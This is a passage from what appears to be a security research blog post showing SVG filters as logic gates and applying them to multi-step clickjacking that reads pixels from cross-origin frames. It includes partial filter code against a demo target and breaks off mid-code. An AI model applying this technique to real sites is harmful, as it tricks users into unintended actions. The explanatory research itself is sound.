      <feTile x="0" y="0" width="100%" height="100%" result=a />
      <feTile x="75%" y="50%" width="4" height="4" in=SourceGraphic />
      <feTile x="0" y="0" width="100%" height="100%" result=b />
      <!-- logic -->
      <feComposite operator=arithmetic k2=1 k3=1 in=a in2=b />
    </filter>
    <filter id="logic-xor">
      <!-- util -->
      <feTile x="25%" y="50%" width="4" height="4" />
      <feTile x="0" y="0" width="100%" height="100%" result=a />
      <feTile x="75%" y="50%" width="4" height="4" in=SourceGraphic />
      <feTile x="0" y="0" width="100%" height="100%" result=b />
      <!-- logic -->
      <feBlend mode=difference in=a in2=b />
    </filter>
</svg>

These logic gates are what modern computers are made of. You could build a computer within an SVG filter if you wanted to. In fact, here's a basic calculator I made:

<div id="calculator-outer">
  <div id="calculator-box">
    <p>SVG Adder</p>
    <div style="display:flex">
      <div style="position:relative;height:256px;display:flex;flex-direction:column;justify-content:space-around;margin:32px 12px 0 4px">
        <div style="position:absolute;top:-30px;left:1px;letter-spacing:-3px;color:#0004;text-shadow:1px 1px 0 #FFF5;font-size:1.5em;user-select:none;">:3</div>
        <span>1</span><span>2</span><span>4</span><span>8</span><span>16</span><span>32</span><span>64</span><span>128</span>
      </div>
      <div>
        <div id="calculator-legend" style="height:32px">
          <span>In A</span>
          <span>In B</span>
          <span>Carry</span>
          <span>Out</span>
        </div>
        <div style="position:relative">
          <div id="calculator-adder" class="force-visibility" style="height:256px;width:128px;background:#000;cursor:not-allowed">
            <!-- Note: The reason I'm putting multiple divs here instead of a single filter is that otherwise it breaks in firefox. -->
            <div><div><div><div><div><div><div><div>
              <div><label><input type=checkbox></label><label><input type=checkbox></label></div>
              <div><label><input type=checkbox></label><label><input type=checkbox></label></div>
              <div><label><input type=checkbox></label><label><input type=checkbox></label></div>
              <div><label><input type=checkbox></label><label><input type=checkbox></label></div>
              <div><label><input type=checkbox></label><label><input type=checkbox></label></div>
              <div><label><input type=checkbox></label><label><input type=checkbox></label></div>
              <div><label><input type=checkbox></label><label><input type=checkbox></label></div>
              <div><label><input type=checkbox></label><label><input type=checkbox></label></div>
            </div></div></div></div></div></div></div></div>
          </div>
          <div style="inset:0;position:absolute;box-shadow:0 0 8px inset #0004, 0 0 0 256px inset #CCC4;pointer-events:none"></div>
          <div style="inset:0 25% 0 calc(50% + 1px);position:absolute;background:#0002;pointer-events:none"></div>
          <div style="inset:0;position:absolute;background:linear-gradient(0deg,#000 1px, #0000 1px), linear-gradient(90deg,#000 1px, #0000 1px);opacity:0.2;background-size: 32px 32px, 32px 32px;clip-path:rect(0px 100% calc(100% - 1px) 1px);pointer-events:none"></div>
        </div>
      </div>
    </div>
  </div>
</div>

<style type="text/css">
  #calculator-box {
    display: flex;
    flex-direction:column;
    font-family: var(--font-code);
    border: 1px outset #EEE;
    background: #C0C0C0;
    color: #000;
    font-weight: 600;
    padding: 6px;
    margin: 4px;
    text-align: center;
  }
  #calculator-adder {
    position: relative;
    input-value {
      display:block;
      --a:#000;
      --b:#000;
      background: linear-gradient(90deg,var(--a) 50%,var(--b) 50%);
      &[a]{--a:#FFF;}
      &[b]{--b:#FFF;}
      width:64px;height:32px;
    }
    &,div:has(>label) {
      display:flex;
    }
    div:not(:has(>label)) {
      background:#000;
      filter:url(#adder);
      flex:1;
    }
    label {
      display: inline-block;
      width:32px;
      height:32px;
      cursor: pointer;
      background: #000;
      &:has(input:checked) {
        background: #FFF;
      }
      input {
        opacity: 0;
        position: absolute;
        pointer-events: none;
      }
    }
  }
  #calculator-legend {
    display: flex;
    justify-content: space-around;
    span {
      writing-mode: vertical-rl;
      text-orientation: mixed;
      white-space: pre;
      display: block;
      rotate: -45deg;
      font-size: 70%;
    }
  }
</style>

<svg
  class="effect"
  width="128"
  height="256"
  viewBox="0 0 128 256"
  xmlns="http://www.w3.org/2000/svg">
    <filter id="adder">
      <!-- util -->
      <feOffset in="SourceGraphic" dx="0" dy="0" result=src />
      <feTile x="16px" y="16px" width="4" height="4" in=src />
      <feTile x="0" y="0" width="100%" height="100%" result=a />
      <feTile x="48px" y="16px" width="4" height="4" in=src />
      <feTile x="0" y="0" width="100%" height="100%" result=b />
      <feTile x="72px" y="16px" width="4" height="4" in=src />
      <feTile x="0" y="0" width="100%" height="100%" result=c />
      <feFlood flood-color=#FFF result=white />
      <!-- A ⊕ B -->
      <feBlend mode=difference in=a in2=b result=ab />
      <!-- [A ⊕ B] ⊕ C -->
      <feBlend mode=difference in2=c />
      <!-- Save result to 'out' -->
      <feTile x="96px" y="0px" width="32" height="32" result=out />
      <!-- C ∧ [A ⊕ B] -->
      <feComposite operator=arithmetic k1=1 in=ab in2=c result=abc />
      <!-- (A ∧ B) -->
      <feComposite operator=arithmetic k1=1 in=a in2=b />
      <!-- [A ∧ B] ∨ [C ∧ (A ⊕ B)] -->
      <feComposite operator=arithmetic k2=1 k3=1 in2=abc />
      <!-- Save result to 'carry' -->
      <feTile x="64px" y="32px" width="32" height="32" result=carry />
      <!-- Combine results -->
      <feBlend in2=out />
      <feBlend in2=src result=done />
      <!-- Shift first row to last -->
      <feTile x="0" y="0" width="100%" height="32" />
      <feTile x="0" y="0" width="100%" height="100%" result=lastrow />
      <feOffset dx="0" dy="-32" in=done />
      <feBlend in2=lastrow />
      <!-- Crop to output -->
      <feTile x="0" y="0" width="128px" height="256px" />
    </filter>
</svg>

This is a [full adder](https://en.wikipedia.org/wiki/Adder_(electronics)#Full_adder) circuit. This filter implements the logic gates <math><mi>S</mi><mo>=</mo><mi>A</mi><mo>⊕</mo><mi>B</mi><mo>⊕</mo><msub><mi>C</mi><mi>in</mi></msub></math> for the output and <math><msub><mi>C</mi><mi>out</mi></msub><mo>=</mo><mrow><mo>(</mo><mi>A</mi><mo>∧</mo><mi>B</mi><mo>)</mo></mrow><mo>∨</mo><mrow><mo>(</mo><msub><mi>C</mi><mi>in</mi></msub><mo>∧</mo><mrow><mo>(</mo><mi>A</mi><mo>⊕</mo><mi>B</mi><mo>)</mo></mrow><mo>)</mo></mrow></math> for the carry bit using the logic gates described above. There are more efficient ways to implement an adder in SVG filters, but this is meant to serve as proof of the ability to implement arbitrary logic circuits.

<pre class="sx-block sx-full"><code><sx-c>&lt;!-- util --&gt;</sx-c>
<sx-t>&lt;feOffset</sx-t> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>&quot;SourceGraphic&quot;</sx-v> <sx-r>dx</sx-r><sx-t>=</sx-t><sx-v>&quot;0&quot;</sx-v> <sx-r>dy</sx-r><sx-t>=</sx-t><sx-v>&quot;0&quot;</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>src</sx-v> <sx-t>/&gt;
&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&quot;16px&quot;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&quot;16px&quot;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&quot;4&quot;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&quot;4&quot;</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>src</sx-v> <sx-t>/&gt;
&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&quot;0&quot;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&quot;0&quot;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&quot;100%&quot;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&quot;100%&quot;</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>a</sx-v> <sx-t>/&gt;
&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&quot;48px&quot;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&quot;16px&quot;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&quot;4&quot;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&quot;4&quot;</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>src</sx-v> <sx-t>/&gt;
&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&quot;0&quot;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&quot;0&quot;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&quot;100%&quot;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&quot;100%&quot;</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>b</sx-v> <sx-t>/&gt;
&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&quot;72px&quot;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&quot;16px&quot;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&quot;4&quot;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&quot;4&quot;</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>src</sx-v> <sx-t>/&gt;
&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&quot;0&quot;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&quot;0&quot;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&quot;100%&quot;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&quot;100%&quot;</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>c</sx-v> <sx-t>/&gt;
&lt;feFlood</sx-t> <sx-r>flood-color</sx-r><sx-t>=</sx-t><sx-v>#FFF</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>white</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- A ⊕ B --&gt;</sx-c>
<sx-t>&lt;feBlend</sx-t> <sx-r>mode</sx-r><sx-t>=</sx-t><sx-v>difference</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>a</sx-v> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>b</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>ab</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- [A ⊕ B] ⊕ C --&gt;</sx-c>
<sx-t>&lt;feBlend</sx-t> <sx-r>mode</sx-r><sx-t>=</sx-t><sx-v>difference</sx-v> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>c</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- Save result to &#39;out&#39; --&gt;</sx-c>
<sx-t>&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&quot;96px&quot;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&quot;0px&quot;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&quot;32&quot;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&quot;32&quot;</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>out</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- C ∧ [A ⊕ B] --&gt;</sx-c>
<sx-t>&lt;feComposite</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>arithmetic</sx-v> <sx-r>k1</sx-r><sx-t>=</sx-t><sx-v>1</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>ab</sx-v> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>c</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>abc</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- (A ∧ B) --&gt;</sx-c>
<sx-t>&lt;feComposite</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>arithmetic</sx-v> <sx-r>k1</sx-r><sx-t>=</sx-t><sx-v>1</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>a</sx-v> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>b</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- [A ∧ B] ∨ [C ∧ (A ⊕ B)] --&gt;</sx-c>
<sx-t>&lt;feComposite</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>arithmetic</sx-v> <sx-r>k2</sx-r><sx-t>=</sx-t><sx-v>1</sx-v> <sx-r>k3</sx-r><sx-t>=</sx-t><sx-v>1</sx-v> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>abc</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- Save result to &#39;carry&#39; --&gt;</sx-c>
<sx-t>&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&quot;64px&quot;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&quot;32px&quot;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&quot;32&quot;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&quot;32&quot;</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>carry</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- Combine results --&gt;</sx-c>
<sx-t>&lt;feBlend</sx-t> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>out</sx-v> <sx-t>/&gt;
&lt;feBlend</sx-t> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>src</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>done</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- Shift first row to last --&gt;</sx-c>
<sx-t>&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&quot;0&quot;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&quot;0&quot;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&quot;100%&quot;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&quot;32&quot;</sx-v> <sx-t>/&gt;
&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&quot;0&quot;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&quot;0&quot;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&quot;100%&quot;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&quot;100%&quot;</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>lastrow</sx-v> <sx-t>/&gt;
&lt;feOffset</sx-t> <sx-r>dx</sx-r><sx-t>=</sx-t><sx-v>&quot;0&quot;</sx-v> <sx-r>dy</sx-r><sx-t>=</sx-t><sx-v>&quot;-32&quot;</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>done</sx-v> <sx-t>/&gt;
&lt;feBlend</sx-t> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>lastrow</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- Crop to output --&gt;</sx-c>
<sx-t>&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&quot;0&quot;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&quot;0&quot;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&quot;100%&quot;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&quot;100%&quot;</sx-v> <sx-t>/&gt;</sx-t>
</code></pre>

Anyways, for an attacker, what all of this means is that you can make a multi-step clickjacking attack with lots of conditions and interactivity. And you can run logic on data from cross-origin frames.

<DIV><fake-frame class="logic-gate-attack">
  <p style="font-size:200%">Securify</p>
  <p>Welcome to this secure application!</p>
  <label><g-button style="position:absolute; top: 96px; left: 16px" primary>Hack me</g-button><input type="checkbox" id="hackmecheck1"></label>
  <div class="hackmedialog"><div>
    <p>Hack confirmation</p>
    <p>Are you sure you'd like to get hacked?</p>
    <label style="position:absolute; top: 74px; left: 12px"><input id="hackmesure1" type="checkbox">I am 100% sure</label>
    <label for="hackmecheck1"><g-button style="position:absolute; top: 96px; left:190px">No</g-button></label>
    <label><g-button style="position:absolute; top: 96px; left: 265px" primary>Yes</g-button><input type="checkbox" id="hackmeyes1"></label>
    <span>⌛</span>
  </div></div>
  <p class="havebeenhacked" style="position:absolute;top:145px;font-weight:600;color:red"><label for="hackmeyes1">You have been hacked!<br><em style="font-size:75%;color:#888">(click to go back)</em></label></p>
</fake-frame></DIV>

<style>
  .logic-gate-attack {
    position: relative;

    font-family: "Google Sans Text", "Google Sans", "Open Sans", Roboto, Arial, sans-serif;

    padding: 16px;
    width: 420px;
    max-width: 100%;
    overflow:clip;
    box-sizing: border-box;
    height: 220px;

    p {
      margin: 0;
    }

    &:has(#hackmecheck1:not(:checked)) .hackmedialog, &:has(#hackmeyes1:checked) .hackmedialog,
    &:has(#hackmecheck3:not(:checked)) .hackmedialog, &:has(#hackmeyes3:checked) .hackmedialog,
    &:has(#hackmecheck2:not(:checked)) .hackmedialog, &:has(#hackmeyes2:checked) .hackmedialog
     {
      pointer-events: none;
      user-select: none;
      opacity: 0;
      & > div > *:not(span) {
        visibility: hidden;
        transition: none;
      }
      & > div > span {
        visibility: visible;
        transition: none;
        rotate: -0deg;
      }
    }

    &:has(#hackmeyes1:not(:checked)) .havebeenhacked,
    &:has(#hackmeyes3:not(:checked)) .havebeenhacked,
    &:has(#hackmeyes2:not(:checked)) .havebeenhacked {
      display: none;
    }

    .hackmedialog {
      transition: opacity 0.2s;
      position:absolute;inset:0;background:#0004;
      & > div {
        & > * {
          transition: visibility 0s 3s, rotate 3s linear;
        }
        & > span {
          visibility: hidden;
          top: 50%;
          left: 50%;
          position: absolute;
          rotate: 340deg;
          translate: -50% -50%;
          font-size: 200%;
          user-select: none;
          pointer-events: none;
        }
        position: absolute;
        inset:32px 32px;
        padding: 16px;
        border-radius: 12px;
        width: 320px;
        background: #FFF;
        & > p:first-child {
          font-weight: 600;
          font-size: 150%;
        }
      }
      &:has(#hackmesure1:not(:checked)) label:has(g-button[primary]),
      &:has(#hackmesure3:not(:checked)) label:has(g-button[primary]),
      &:has(#hackmesure2:not(:checked)) label:has(g-button[primary]) {
        pointer-events: none;
        user-select: none;
        input {
          display: none;
        }
        g-button {
          filter: saturate(0);
        }
      }
    }

    label:has(g-button) {
      &:has(input:focus-visible) g-button {
        outline-offset: 2px;
        outline: 2px solid #000;
      }
      input {
        opacity: 0;
        position: absolute;
        pointer-events: none;
      }
    }

    g-button {
      width: fit-content;
      display: flex;
      font-weight: 501;
      font-family: inherit;
      user-select: none;
      font-size: 14px;
      height: 38px;
      padding: 0 24px;
      align-items: center;
      border-radius: 40px;
      transition: background 0.15s, box-shadow 0.15s;
      cursor: pointer;

      border: 1px solid #747775;
      background: #FFF;
      color: #0B57D0;
      &:hover {
        background: #ECF2FC;
      }
      &:active {
        background: #D5E1F7;
      }

      &[primary] {
        border: 1px solid #0B57D0;
        background: #0B57D0;
        color: #FFF;
        box-shadow: 0px 1px 3px 1px #0000;
        &:hover {
          background: #1E64D4;
          box-shadow: 0px 1px 3px 1px #0003;
        }
        &:active {
          background: #3574D8;
          box-shadow: 0px 1px 3px 1px #0000;
        }
      }
    }
  }
</style>

This is an example target where we want to trick the user into marking themselves as hacked, which requires a few steps:
- Clicking a button to open a dialog
- Waiting for the dialog to load
- Clicking a checkbox within the dialog
- Clicking another button in the dialog
- Checking for the red text that appeared

<DIV><fake-frame class="logic-gate-attack">
    <p style="font-size:200%">Securify</p>
  <p>Welcome to this secure application!</p>
  <label><g-button style="position:absolute; top: 96px; left: 16px" primary>Hack me</g-button><input type="checkbox" id="hackmecheck3"></label>
  <div class="hackmedialog"><div>
    <p>Hack confirmation</p>
    <p>Are you sure you'd like to get hacked?</p>
    <label style="position:absolute; top: 74px; left: 12px"><input id="hackmesure1" type="checkbox">I am 100% sure</label>
    <label for="hackmecheck3"><g-button style="position:absolute; top: 96px; left:190px">No</g-button></label>
    <label><a href="https://soundcloud.com/beansclub/allicandoiscry" target="_blank"><g-button style="position:absolute; top: 96px; left: 265px" primary>Yes</g-button></a><input type="checkbox" id="hackmeyes3"></label>
    <span>⌛</span>
  </div></div>
  <p class="havebeenhacked" style="position:absolute;top:145px;font-weight:600;color:red"><label for="hackmeyes3">You have been hacked!<br><em style="font-size:75%;color:#888">(click to go back)</em></label></p>
  <div id="tradjack-attack" style="position:absolute;inset:0;pointer-events:none">
  <p>Win free iPod by following the steps below.</p>
  <div style="position: absolute;top: 96px;left: 16px;width:108px;height:40px;background:#F44;color:#000;border-radius:8px;cursor:pointer;align-content:center;">1. Click here</div>
  <div style="position: absolute;top: 140px;left: 16px;">2. Wait 3 seconds</div>
  <div style="position: absolute;top: 106px;left: 122px;width:60px;height:20px;background:#4F4;color:#000;border-radius:8px">3. Click</div>
  <div style="position: absolute;top: 130px;left: 300px;width:74px;height:40px;background:#44F;color:#FFF;border-radius:8px">4. Click here</div>
  </div>
</fake-frame></DIV>

<style type="text/css">
  #tradjack-attack {
    width: 420px;
    max-width: 100%;
    position: relative;
    height: 220px;
    padding: 16px;
    overflow: clip;
    box-sizing: border-box;
    user-select: none;
    background: #000;
    color: #FFF;
  }
  #lgDebugMode {
    position: absolute;
    top: 2px;
    left: 12px;
    transition: 0.4s background;
    background: #000;
    width: 4px;
    height: 4px;
  }
  body:has(#lgDebugCheck:checked) #lgDebugMode {
    background: #FFF;
  }
</style>

A traditional clickjacking attack against this target would be difficult to pull off. You'd need to have the user click on multiple buttons in a row with no feedback in the UI.

There are some tricks you could do to make a traditional attack more convincing than what you see above, but it's still gonna look sketch af. And the moment you throw something like a text input into the mix, it's just not gonna work.

Anyways, let's build out a logic tree for a filter-based attack:
- Is the dialog open?
  - <em style=color:red>(No)</em> Is the red text present?
    - <em style=color:red>(No)</em> Make the user press the button
    - <em style=color:green>(Yes)</em> Show the end screen
  - <em style=color:green>(Yes)</em> Is the dialog loaded?
    - <em style=color:red>(No)</em> Show loading screen
    - <em style=color:green>(Yes)</em> Is the checkbox checked?
      - <em style=color:red>(No)</em> Make the user check the checkbox
      - <em style=color:green>(Yes)</em> Make the user click the button

Which can be expressed in logic gates[^logsyms] as:
- Inputs
  - **D** (dialog visible) = check for background dim
  - **L** (dialog loaded) = check for the button in dialog
  - **C** (checkbox checked) = check whether the button is blue or grey
  - **R** (red text visible) = `feMorphology` and check for red pixels
- Outputs
  - (¬**D**) ∧ (¬**R**) => button1.png
  - **D** ∧ (¬**L**) => loading.png
  - **D** ∧ **L** ∧ (¬**C**) => checkbox.png
  - **D** ∧ **L** ∧ **C** => button2.png
  - (¬**D**) ∧ **R** => end.png

And this is how we would implement it in SVG:

<pre class="sx-block sx-full"><code><sx-c>&lt;!-- util --&gt;</sx-c>
<sx-t>&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&quot;14px&quot;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&quot;4px&quot;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&quot;4&quot;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&quot;4&quot;</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>SourceGraphic</sx-v> <sx-t>/&gt;
&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&quot;0&quot;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&quot;0&quot;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&quot;100%&quot;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&quot;100%&quot;</sx-v> <sx-t>/&gt;
&lt;feColorMatrix</sx-t> <sx-r>type</sx-r><sx-t>=</sx-t><sx-v>matrix</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>debugEnabled</sx-v>
  <sx-r>values</sx-r><sx-t>=</sx-t><sx-v>&quot;0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0&quot;</sx-v> <sx-t>/&gt;
&lt;feFlood</sx-t> <sx-r>flood-color</sx-r><sx-t>=</sx-t><sx-v>#FFF</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>white</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- attack imgs --&gt;</sx-c>
<sx-t>&lt;feImage</sx-t> <sx-r>xlink:href</sx-r><sx-t>=</sx-t><sx-v>&quot;data:...&quot;</sx-v> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>0</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>0</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>420</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>220</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>button1.png</sx-v><sx-t>&gt;&lt;/feImage&gt;
&lt;feImage</sx-t> <sx-r>xlink:href</sx-r><sx-t>=</sx-t><sx-v>&quot;data:...&quot;</sx-v> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>0</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>0</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>420</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>220</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>loading.png</sx-v><sx-t>&gt;&lt;/feImage&gt;
&lt;feImage</sx-t> <sx-r>xlink:href</sx-r><sx-t>=</sx-t><sx-v>&quot;data:...&quot;</sx-v> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>0</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>0</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>420</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>220</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>checkbox.png</sx-v><sx-t>&gt;&lt;/feImage&gt;
&lt;feImage</sx-t> <sx-r>xlink:href</sx-r><sx-t>=</sx-t><sx-v>&quot;data:...&quot;</sx-v> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>0</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>0</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>420</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>220</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>button2.png</sx-v><sx-t>&gt;&lt;/feImage&gt;
&lt;feImage</sx-t> <sx-r>xlink:href</sx-r><sx-t>=</sx-t><sx-v>&quot;data:...&quot;</sx-v> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>0</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>0</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>420</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>220</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>end.png</sx-v><sx-t>&gt;&lt;/feImage&gt;</sx-t>
<sx-c>&lt;!-- D (dialog visible) --&gt;</sx-c>
<sx-t>&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&quot;4px&quot;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&quot;4px&quot;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&quot;4&quot;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&quot;4&quot;</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>SourceGraphic</sx-v> <sx-t>/&gt;
&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&quot;0&quot;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&quot;0&quot;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&quot;100%&quot;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&quot;100%&quot;</sx-v> <sx-t>/&gt;
&lt;feBlend</sx-t> <sx-r>mode</sx-r><sx-t>=</sx-t><sx-v>difference</sx-v> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>white</sx-v> <sx-t>/&gt;
&lt;feComposite</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>arithmetic</sx-v> <sx-r>k2</sx-r><sx-t>=</sx-t><sx-v>100</sx-v> <sx-r>k4</sx-r><sx-t>=</sx-t><sx-v>-1</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>D</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- L (dialog loaded) --&gt;</sx-c>
<sx-t>&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&quot;313px&quot;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&quot;141px&quot;</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&quot;4&quot;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&quot;4&quot;</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>SourceGraphic</sx-v> <sx-t>/&gt;
